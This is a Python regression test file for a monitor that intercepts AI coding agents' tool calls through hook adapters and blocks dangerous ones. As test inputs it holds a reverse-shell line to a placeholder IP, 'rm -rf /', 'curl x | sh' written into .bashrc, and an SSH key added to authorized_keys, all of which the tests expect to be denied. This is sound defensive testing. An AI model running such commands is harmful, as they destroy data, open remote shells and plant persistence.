"""多 agent 支持的回归测试：注册表、各家 hook 协议的适配器（stdin → 规范事件 → 判定 →
各家认得的输出）、install.py 对各家配置文件的幂等写入、以及探针脚本渲染。

直接跑：python3 -m unittest tests/test_agents.py
用隔离的 CC_MONITOR_HOME，不碰 ~/.cc-monitor。
"""
import json
import os
import sqlite3
import subprocess
import sys
import tempfile
import unittest

_TMP = tempfile.mkdtemp(prefix="cc-monitor-test-")
os.environ["CC_MONITOR_HOME"] = _TMP
_REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, _REPO)

from cc_monitor import adapters, audit_state, policy, procscan, registry  # noqa: E402
from cc_monitor.adapters import antigravity, codex, cursor, gemini, grok, opencode, zcode  # noqa: E402

# 同 test_audit_state.py：子进程要用进程内模块实际在用的 CONFIG_DIR。
_TMP = str(audit_state.CONFIG_DIR)


def run_hook(agent, mode, payload):
    proc = subprocess.run(
        [sys.executable, "-m", "cc_monitor.hook", mode, "--agent", agent],
        input=json.dumps(payload), capture_output=True, text=True, cwd=_REPO,
        env={**os.environ, "CC_MONITOR_HOME": _TMP},
    )
    return proc.returncode, proc.stdout.strip(), proc.stderr


def last_events(n=1):
    conn = sqlite3.connect(os.path.join(_TMP, "events.db"))
    try:
        return conn.execute(
            "SELECT agent, source, tool_name, native_tool, risk, matched_rule, decision, detail "
            "FROM events ORDER BY id DESC LIMIT ?", (n,)).fetchall()
    finally:
        conn.close()


class TestRegistry(unittest.TestCase):
    def test_every_spec_has_the_required_shape(self):
        for aid in registry.ids():
            spec = registry.get(aid)
            self.assertEqual(spec["id"], aid)
            self.assertTrue(spec.get("display"))
            self.assertIn("process", spec)
            if spec.get("hooks"):
                self.assertIn(spec["hooks"]["protocol"], ("claude", "codex", "gemini", "cursor", "opencode", "zcode", "antigravity", "grok"))
                self.assertTrue(spec["hooks"]["events"])
                self.assertTrue(spec["hooks"]["config"]["user_path"])
            self.assertIn(spec.get("status"), ("verified", "experimental"))

    def test_unknown_agent_falls_back_to_claude(self):
        self.assertIsNone(registry.get("nope"))
        self.assertIs(adapters.for_agent("nope"), adapters.for_protocol("claude"))

    def test_classify_process(self):
        self.assertEqual(registry.classify_process("claude", "claude"), "claude-code")
        self.assertEqual(registry.classify_process("codex-x86_64-un", "/x/codex-x86_64-unknown-linux-musl"), "codex")
        # node 托管的 agent：comm 是解释器名，只能靠 argv
        self.assertEqual(registry.classify_process("node", "node /usr/lib/node_modules/@google/gemini-cli/dist/index.js"), "gemini-cli")
        self.assertEqual(registry.classify_process("python3", "/usr/bin/python3 /home/u/.local/bin/aider --model x"), "aider")
        self.assertEqual(registry.classify_process("node", "/opt/ZCode/resources/glm/index.js"), "zcode")
        self.assertEqual(registry.classify_process("zcode", "node /usr/lib/node_modules/zcode-cli/bin/zcode"), "zcode")
        self.assertIsNone(registry.classify_process("bash", "bash -c ls"))
        self.assertIsNone(registry.classify_process("node", "node server.js"))

    def test_tool_and_field_mapping(self):
        self.assertEqual(registry.map_tool("gemini-cli", "run_shell_command"), "Bash")
        self.assertEqual(registry.map_tool("opencode", "webfetch"), "WebFetch")
        self.assertEqual(registry.map_tool("codex", "something_new"), "something_new")
        self.assertEqual(registry.map_fields("opencode", {"filePath": "/a", "oldString": "x"}),
                         {"file_path": "/a", "old_string": "x"})

    def test_workdir_ignores_every_agents_state_dir(self):
        from cc_monitor import workdir
        for rel in (".claude/projects", ".codex/sessions", ".gemini/tmp", ".cursor/projects"):
            self.assertIn(rel, workdir.HOME_IGNORE)
        for marker in ("CLAUDE.md", "AGENTS.md", "GEMINI.md", ".cursor"):
            self.assertIn(marker, workdir.PROJECT_MARKERS)


class TestRulesUseRegistry(unittest.TestCase):
    def test_config_tamper_rule_expands_from_registry(self):
        rules = policy.load_rules()
        by_id = {r["id"]: r for r in rules}
        self.assertNotIn("@registry", by_id["agent_config_tamper"]["pattern"])
        for path, expected in (
            ("/home/u/.codex/hooks.json", "agent_config_tamper"),
            ("/proj/.gemini/settings.json", "agent_config_tamper"),
            ("/proj/AGENTS.md", "agent_config_tamper"),
            ("/home/u/.claude/settings.json", "claude_config_tamper"),  # 老规则排在前面，照旧先命中
            ("/proj/README.md", None),
        ):
            rule, _ = policy.evaluate("Write", {"file_path": path}, rules=rules)
            self.assertEqual(rule["id"] if rule else None, expected, path)

    def test_history_rule_covers_other_agents_transcripts(self):
        rules = policy.load_rules()
        rule, _ = policy.evaluate("Read", {"file_path": "/home/u/.codex/history.jsonl"}, rules=rules)
        self.assertEqual(rule["id"], "history_file_read")

    def test_rule_scoped_to_agents(self):
        rules = [{"id": "only_codex", "risk": "low", "action": "log", "tools": ["Bash"], "field": "command",
                  "pattern": "zzz", "agents": ["codex"]}]
        self.assertIsNotNone(policy.evaluate("Bash", {"command": "zzz"}, rules=rules, agent="codex")[0])
        self.assertIsNone(policy.evaluate("Bash", {"command": "zzz"}, rules=rules, agent="gemini-cli")[0])
        self.assertIsNone(policy.evaluate("Bash", {"command": "zzz"}, rules=rules)[0])


class TestAdapterParsing(unittest.TestCase):
    def test_codex_apply_patch_is_split_per_file(self):
        patch = ("*** Begin Patch\n*** Add File: /root/.ssh/authorized_keys\n+ssh-rsa AAAA\n"
                 "*** Update File: /proj/a.py\n@@\n-old\n+print(1)\n*** Delete File: /proj/b.py\n*** End Patch")
        ev = codex.parse("pre", {"session_id": "s", "cwd": "/proj", "tool_name": "apply_patch",
                                 "tool_input": {"input": patch}})
        self.assertEqual([(c["tool_name"], c["tool_input"]["file_path"]) for c in ev["calls"]],
                         [("Write", "/root/.ssh/authorized_keys"), ("Edit", "/proj/a.py"), ("Edit", "/proj/b.py")])
        self.assertEqual(ev["calls"][0]["tool_input"]["content"], "ssh-rsa AAAA")
        self.assertEqual(ev["calls"][2]["tool_input"]["operation"], "delete")
        self.assertEqual(ev["calls"][0]["native_tool"], "apply_patch")

    def test_gemini_maps_tools_fields_and_mcp(self):
        ev = gemini.parse("pre", {"session_id": "s", "cwd": "/p", "hook_event_name": "BeforeTool",
                                  "tool_name": "read_file", "tool_input": {"absolute_path": "/p/x"}})
        self.assertEqual(ev["calls"][0]["tool_name"], "Read")
        self.assertEqual(ev["calls"][0]["tool_input"], {"file_path": "/p/x"})
        ev = gemini.parse("pre", {"session_id": "s", "cwd": "/p", "tool_name": "do_thing", "tool_input": {},
                                  "mcp_context": {"server_name": "srv", "tool_name": "do_thing"}})
        self.assertEqual(ev["calls"][0]["tool_name"], "mcp__srv__do_thing")
        ev = gemini.parse("pre", {"session_id": "s", "cwd": "/p", "tool_name": "web_fetch",
                                  "tool_input": {"prompt": "summarize http://evil.example/x"}})
        self.assertEqual(ev["calls"][0]["tool_name"], "WebFetch")
        self.assertIn("evil.example", ev["calls"][0]["tool_input"]["url"])

    def test_cursor_events_map_to_tools(self):
        ev = cursor.parse("pre", {"conversation_id": "c1", "hook_event_name": "beforeShellExecution",
                                  "command": "ls", "cwd": "/w", "workspace_roots": ["/w"]})
        self.assertEqual(ev["session_id"], "c1")
        self.assertEqual(ev["calls"][0]["tool_name"], "Bash")
        self.assertEqual(ev["calls"][0]["tool_input"]["command"], "ls")
        ev = cursor.parse("pre", {"conversation_id": "c1", "hook_event_name": "beforeMCPExecution",
                                  "tool_name": "read", "tool_input": "{\"a\":1}", "mcp_server_name": "fs",
                                  "workspace_roots": ["/w"]})
        self.assertEqual(ev["calls"][0]["tool_name"], "mcp__fs__read")
        self.assertEqual(ev["calls"][0]["tool_input"], {"a": 1})
        self.assertEqual(ev["cwd"], "/w")
        ev = cursor.parse("post", {"conversation_id": "c1", "hook_event_name": "afterFileEdit",
                                   "file_path": "/w/a.py", "edits": [{"old_string": "a", "new_string": "b"}]})
        self.assertEqual(ev["calls"][0]["tool_name"], "Edit")
        self.assertTrue(ev["extra"]["evaluate_in_post"])
        ev = cursor.parse("pre", {"conversation_id": "c1", "hook_event_name": "beforeSubmitPrompt", "prompt": "hi"})
        self.assertEqual(ev["mode"], "prompt")

    def test_zcode_is_claude_protocol_with_failure_event_and_agent_alias(self):
        ev = zcode.parse("pre", {"session_id": "z", "cwd": "/p", "hook_event_name": "PreToolUse",
                                 "tool_name": "Agent", "tool_input": {"prompt": "x"}, "tool_use_id": "t"})
        self.assertEqual((ev["calls"][0]["tool_name"], ev["calls"][0]["native_tool"]), ("Task", "Agent"))
        ev = zcode.parse("post", {"session_id": "z", "cwd": "/p", "hook_event_name": "PostToolUseFailure",
                                  "tool_name": "Bash", "tool_input": {"command": "ls"}, "error": "boom"})
        self.assertEqual(ev["calls"][0]["tool_response"]["error"], "boom")
        blocked = {"decision": "blocked", "handled_via_confirm": False, "reason": "no", "rule_id": "r"}
        self.assertEqual(zcode.emit_pre(blocked), (None, 2))
        cfg = zcode.hook_config_entries("/bin/h", "zcode", {"PreToolUse": "pre"})
        self.assertEqual(cfg["PreToolUse"][0]["hooks"][0]["args"], ["pre", "--agent", "zcode"])
        self.assertEqual(cfg["PreToolUse"][0]["hooks"][0]["type"], "process")

    def test_antigravity_maps_pascal_case_args_and_decision_output(self):
        # 真机抓到的 stdin 形状（agy 1.2.6）
        ev = antigravity.parse("pre", {"conversationId": "c1", "workspacePaths": ["/w"], "modelName": "gemini-3.8-flash-high",
                                       "transcriptPath": "/w/.system_generated/logs/transcript.jsonl", "stepIdx": 3,
                                       "toolCall": {"name": "run_command", "args": {"CommandLine": "ls -la", "Cwd": "/w/sub", "WaitMsBeforeAsync": 5000}}})
        c = ev["calls"][0]
        # 事件 cwd 是工作区根（会话 cwd 要稳定），run_command 自带的 Cwd 留在 tool_input.cwd
        self.assertEqual((c["tool_name"], c["tool_input"]["command"], ev["cwd"], ev["session_id"]), ("Bash", "ls -la", "/w", "c1"))
        self.assertEqual(c["tool_input"]["cwd"], "/w/sub")
        self.assertEqual(ev["extra"]["model"], "gemini-3.8-flash-high")
        ev = antigravity.parse("pre", {"conversationId": "c1", "workspacePaths": ["/w"],
                                       "toolCall": {"name": "write_to_file", "args": {"TargetFile": "/w/a.py", "CodeContent": "x", "Overwrite": True}}})
        self.assertEqual((ev["calls"][0]["tool_name"], ev["calls"][0]["tool_input"]["file_path"], ev["calls"][0]["tool_input"]["content"]), ("Write", "/w/a.py", "x"))
        ev = antigravity.parse("pre", {"conversationId": "c1", "toolCall": {"name": "multi_replace_file_content", "args": {
            "TargetFile": "/w/a.py", "ReplacementChunks": [{"ReplacementContent": "eval(x)"}, {"ReplacementContent": "y"}]}}})
        self.assertEqual(ev["calls"][0]["tool_input"]["new_string"], "eval(x)\ny")
        blocked = {"decision": "blocked", "handled_via_confirm": False, "reason": "no", "rule_id": "r"}
        out, code = antigravity.emit_pre(blocked)
        self.assertEqual((json.loads(out), code), ({"decision": "deny", "reason": "no"}, 0))
        self.assertEqual(json.loads(antigravity.emit_pre({"decision": "allowed", "handled_via_confirm": True, "reason": None, "rule_id": "r"})[0]), {"decision": "allow"})
        # PreInvocation：第 0 次当会话开始，之后不记
        self.assertEqual(antigravity.parse("prompt", {"conversationId": "c1", "invocationNum": 0})["mode"], "session_start")
        self.assertEqual(antigravity.parse("prompt", {"conversationId": "c1", "invocationNum": 3})["mode"], "noop")
        cfg = antigravity.hook_config_entries("/bin/h", "antigravity-cli", {"PreToolUse": "pre", "Stop": "stop"})
        self.assertTrue(cfg["enabled"])
        self.assertIn("matcher", cfg["PreToolUse"][0])
        self.assertEqual(cfg["Stop"][0]["type"], "command")

    def test_grok_protocol(self):
        ev = grok.parse("pre", {"hook_event_name": "PreToolUse", "session_id": "g", "cwd": "/w", "tool_name": "edit_file",
                                "tool_input": {"path": "/w/a", "old_string": "x", "new_string": "y"}})
        self.assertEqual((ev["calls"][0]["tool_name"], ev["calls"][0]["tool_input"]["file_path"]), ("Edit", "/w/a"))
        ev = grok.parse("post", {"hook_event_name": "PostToolUseFailure", "session_id": "g", "cwd": "/w", "tool_name": "bash",
                                 "tool_input": {"command": "ls"}, "error": "boom"})
        self.assertEqual(ev["calls"][0]["tool_response"], {"error": "boom"})
        self.assertEqual(grok.parse("prompt", {"hook_event_name": "UserPromptSubmit", "cwd": "/w", "user_prompt": "hi"})["prompt"], "hi")
        out, code = grok.emit_pre({"decision": "blocked", "handled_via_confirm": False, "reason": "no", "rule_id": "r"})
        self.assertEqual(code, 2)
        self.assertEqual(json.loads(out)["decision"], "block")

    def test_opencode_maps_camel_case(self):
        ev = opencode.parse("pre", {"session_id": "s", "cwd": "/p", "tool_name": "edit",
                                    "tool_input": {"filePath": "/p/a", "oldString": "x", "newString": "y"}})
        self.assertEqual(ev["calls"][0]["tool_name"], "Edit")
        self.assertEqual(ev["calls"][0]["tool_input"]["file_path"], "/p/a")
        self.assertEqual(ev["calls"][0]["tool_input"]["new_string"], "y")

    def test_emit_formats(self):
        blocked = {"decision": "blocked", "handled_via_confirm": False, "reason": "no", "rule_id": "r"}
        allowed = {"decision": "allowed", "handled_via_confirm": True, "reason": None, "rule_id": "r"}
        out, code = codex.emit_pre(blocked)
        self.assertEqual(json.loads(out)["hookSpecificOutput"]["permissionDecision"], "deny")
        self.assertEqual(code, 0)
        out, code = gemini.emit_pre(blocked)
        self.assertEqual(json.loads(out), {"decision": "deny", "reason": "no"})
        self.assertEqual(json.loads(gemini.emit_pre(allowed)[0]), {"decision": "allow"})
        out, code = cursor.emit_pre(blocked)
        self.assertEqual(json.loads(out)["permission"], "deny")
        self.assertEqual(json.loads(cursor.emit_pre(allowed)[0]), {"permission": "allow"})
        self.assertEqual(opencode.emit_pre(blocked), (None, 2))
        self.assertEqual(opencode.emit_pre(allowed), (None, 0))
        # 没被我们审查过的调用：谁都不输出任何 JSON，agent 自己的确认框该弹还弹
        untouched = {"decision": "allowed", "handled_via_confirm": False, "reason": None, "rule_id": None}
        for mod in (codex, gemini, cursor, opencode):
            self.assertEqual(mod.emit_pre(untouched), (None, 0))


class TestHookEndToEnd(unittest.TestCase):
    def setUp(self):
        audit_state.set_state("running")

    def test_codex_block_writes_event_with_agent(self):
        code, out, err = run_hook("codex", "pre", {"session_id": "cx1", "cwd": "/tmp", "tool_name": "Bash",
                                                   "tool_input": {"command": "rm -rf /"}})
        self.assertEqual(code, 0)
        self.assertEqual(json.loads(out)["hookSpecificOutput"]["permissionDecision"], "deny")
        self.assertIn("dangerous_delete", err)
        agent, source, tool, native, risk, rule, decision, _ = last_events()[0]
        self.assertEqual((agent, source, tool, native, rule, decision), ("codex", "hook_pre", "Bash", None, "dangerous_delete", "blocked"))

    def test_gemini_block_uses_gemini_output(self):
        code, out, _ = run_hook("gemini-cli", "pre", {"session_id": "g1", "cwd": "/tmp", "tool_name": "run_shell_command",
                                                      "tool_input": {"command": "rm -rf ~"}})
        self.assertEqual(code, 0)
        self.assertEqual(json.loads(out)["decision"], "deny")
        agent, _, tool, native, _, rule, decision, _ = last_events()[0]
        self.assertEqual((agent, tool, native, rule, decision), ("gemini-cli", "Bash", "run_shell_command", "dangerous_delete", "blocked"))

    def test_cursor_block_uses_permission_field(self):
        code, out, _ = run_hook("cursor", "pre", {"conversation_id": "c9", "hook_event_name": "beforeShellExecution",
                                                  "command": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "cwd": "/tmp"})
        self.assertEqual(code, 0)
        self.assertEqual(json.loads(out)["permission"], "deny")
        self.assertEqual(last_events()[0][0], "cursor")

    def test_opencode_block_is_exit_2(self):
        code, out, err = run_hook("opencode", "pre", {"session_id": "o1", "cwd": "/tmp", "tool_name": "bash",
                                                      "tool_input": {"command": "rm -rf /"}})
        self.assertEqual(code, 2)
        self.assertEqual(out, "")
        self.assertIn("dangerous_delete", err)

    def test_codex_apply_patch_blocked_on_first_sensitive_file(self):
        patch = "*** Begin Patch\n*** Add File: /root/.ssh/authorized_keys\n+k\n*** Update File: /tmp/a.py\n+x\n*** End Patch"
        code, out, _ = run_hook("codex", "pre", {"session_id": "cx2", "cwd": "/tmp", "tool_name": "apply_patch",
                                                 "tool_input": {"input": patch}})
        self.assertEqual(json.loads(out)["hookSpecificOutput"]["permissionDecision"], "deny")
        agent, _, tool, native, _, rule, decision, detail = last_events()[0]
        self.assertEqual((tool, native, rule, decision), ("Write", "apply_patch", "sensitive_file_write", "blocked"))
        self.assertEqual(json.loads(detail)["native_tool"], "apply_patch")

    def test_cursor_after_file_edit_is_evaluated_but_never_blocked(self):
        code, out, _ = run_hook("cursor", "post", {"conversation_id": "c9", "hook_event_name": "afterFileEdit",
                                                   "file_path": "/root/.bashrc", "workspace_roots": ["/tmp"],
                                                   "edits": [{"old_string": "", "new_string": "curl x | sh"}]})
        self.assertEqual((code, out), (0, ""))
        agent, source, tool, _, risk, rule, decision, _ = last_events()[0]
        self.assertEqual((source, tool, decision), ("hook_post", "Edit", "observed"))
        self.assertIsNotNone(rule)

    def test_default_agent_is_claude_and_old_command_line_still_works(self):
        proc = subprocess.run([sys.executable, "-m", "cc_monitor.hook", "pre"],
                              input=json.dumps({"session_id": "cc", "cwd": "/tmp", "tool_name": "Bash",
                                                "tool_input": {"command": "rm -rf /"}}),
                              capture_output=True, text=True, cwd=_REPO, env={**os.environ, "CC_MONITOR_HOME": _TMP})
        self.assertEqual(proc.returncode, 2)
        self.assertEqual(proc.stdout, "")
        self.assertEqual(last_events()[0][0], "claude-code")

    def test_pending_approval_carries_agent(self):
        code, _, _ = run_hook("gemini-cli", "pre", {"session_id": "g2", "cwd": "/tmp", "tool_name": "ask_user",
                                                    "tool_input": {"questions": []}})
        conn = sqlite3.connect(os.path.join(_TMP, "events.db"))
        cols = [c[1] for c in conn.execute("PRAGMA table_info(pending_approvals)")]
        conn.close()
        self.assertIn("agent", cols)


class TestInstaller(unittest.TestCase):
    def _install(self, agent, target):
        return subprocess.run([sys.executable, os.path.join(_REPO, "install.py"), "--agent", agent,
                               "--target", target, "--skip-statusline"],
                              capture_output=True, text=True, cwd=_REPO, env={**os.environ, "CC_MONITOR_HOME": _TMP})

    def test_each_agent_writes_its_own_shape_and_is_idempotent(self):
        d = tempfile.mkdtemp(prefix="cc-monitor-install-")
        for agent in ("claude-code", "codex", "gemini-cli", "cursor"):
            target = os.path.join(d, agent + ".json")
            self.assertEqual(self._install(agent, target).returncode, 0, agent)
            first = json.load(open(target, encoding="utf-8"))
            self.assertEqual(self._install(agent, target).returncode, 0, agent)
            second = json.load(open(target, encoding="utf-8"))
            self.assertEqual(first, second, "重跑 install 不能重复加条目: " + agent)
            spec = registry.get(agent)
            self.assertEqual(set(first["hooks"]), set(spec["hooks"]["events"]), agent)
            cmds = json.dumps(first)
            if agent == "claude-code":
                self.assertNotIn("--agent", cmds)  # 老安装形状原样保留
            else:
                self.assertIn("--agent " + agent, cmds)
            if agent == "cursor":
                self.assertEqual(first["version"], 1)
                self.assertIn("command", first["hooks"]["beforeShellExecution"][0])
            else:
                self.assertEqual(first["hooks"][next(iter(first["hooks"]))][0]["hooks"][0]["type"], "command")

    def test_zcode_config_keeps_other_hooks_and_enables_hooks(self):
        d = tempfile.mkdtemp(prefix="cc-monitor-install-")
        target = os.path.join(d, "config.json")
        with open(target, "w", encoding="utf-8") as f:
            json.dump({"hooks": {"enabled": False, "events": {"Stop": [{"matcher": ".*", "hooks": [
                {"type": "process", "command": "python3", "args": ["/x/retain.py"]}]}]}}, "other": 1}, f)
        self.assertEqual(self._install("zcode", target).returncode, 0)
        self.assertEqual(self._install("zcode", target).returncode, 0)
        cfg = json.load(open(target, encoding="utf-8"))
        self.assertEqual(cfg["other"], 1)
        self.assertTrue(cfg["hooks"]["enabled"])
        self.assertEqual(set(cfg["hooks"]["events"]), set(registry.get("zcode")["hooks"]["events"]))
        stop = cfg["hooks"]["events"]["Stop"]
        self.assertEqual(len(stop), 2, "别人的 Stop hook 要保留，我们的只加一次")
        self.assertEqual(stop[0]["hooks"][0]["command"], "python3")

    def test_opencode_writes_plugin_with_hook_path(self):
        d = tempfile.mkdtemp(prefix="cc-monitor-install-")
        target = os.path.join(d, "cc-monitor.js")
        self.assertEqual(self._install("opencode", target).returncode, 0)
        text = open(target, encoding="utf-8").read()
        self.assertIn("CC-Monitor-hook", text)
        self.assertNotIn("__CC_MONITOR_HOOK_BIN__", text)
        self.assertIn("tool.execute.before", text)


class TestProbeRendering(unittest.TestCase):
    def test_comm_predicate_lists_every_compiled_agent(self):
        pred = procscan.comm_predicate()
        for comm in ("claude", "codex", "opencode"):
            self.assertIn('comm == "{}"'.format(comm), pred)
        self.assertIn('strncmp(comm, "codex-x86_64", 12) == 0', pred)

    def test_nested_agent_is_its_own_root(self):
        procs = {
            1: {"ppid": 0, "comm": "init", "argv": "", "exe": ""},
            10: {"ppid": 1, "comm": "zsh", "argv": "zsh", "exe": ""},
            20: {"ppid": 10, "comm": "claude", "argv": "claude", "exe": "/x/claude"},
            21: {"ppid": 20, "comm": "zsh", "argv": "zsh -c codex", "exe": ""},
            22: {"ppid": 21, "comm": "node", "argv": "node /usr/lib/node_modules/@openai/codex/bin/codex.js", "exe": ""},
            30: {"ppid": 1, "comm": "node", "argv": "node /usr/lib/node_modules/@google/gemini-cli/dist/index.js", "exe": ""},
            31: {"ppid": 30, "comm": "bash", "argv": "bash -c ls", "exe": ""},
        }
        roots = procscan.find_roots(procs)
        self.assertEqual(roots, {20: "claude-code", 22: "codex", 30: "gemini-cli"})
        seed = procscan.seed_map(procs)
        self.assertEqual(seed[22], (22, "codex"))  # 嵌套的 codex 是自己的根（hook 事件按 --agent codex 记）
        self.assertEqual(seed[21], (20, "claude-code"))  # codex 的父 shell 仍归 claude
        self.assertEqual(seed[31], (30, "gemini-cli"))
        block = procscan.seed_block(seed)
        self.assertIn("@watch[31] = 1; @root[31] = 30;", block)


if __name__ == "__main__":
    unittest.main()
